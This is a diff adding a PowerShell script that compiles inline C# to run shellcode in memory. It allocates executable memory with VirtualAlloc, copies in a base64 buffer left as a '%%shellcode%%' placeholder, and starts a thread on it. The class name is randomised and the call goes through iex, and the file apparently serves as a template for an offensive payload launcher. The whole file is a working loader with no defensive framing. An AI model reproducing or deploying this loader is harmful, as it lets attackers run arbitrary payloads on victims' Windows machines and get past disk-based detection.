@@ -1,0 +1,37 @@
+﻿$id=get-random
+
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+
+namespace RunFromConsole
+{
+    
+    public static class RunCode$id
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
+        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        public static void Run()
+        {
+            Console.WriteLine(DateTime.Now);
+            byte[] buf = Convert.FromBase64String("%%shellcode%%");
+                
+                IntPtr handle = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x00001000 | 0x00002000, 0x40);
+                Marshal.Copy(buf, 0, handle, buf.Length);
+                IntPtr thread = CreateThread(IntPtr.Zero, 0, handle, IntPtr.Zero, 0, IntPtr.Zero);
+
+         
+        }
+    }
+}
+"@
+Add-Type -TypeDefinition $code -Language CSharp 
+iex "[RunFromConsole.RunCode$id]::Run()"
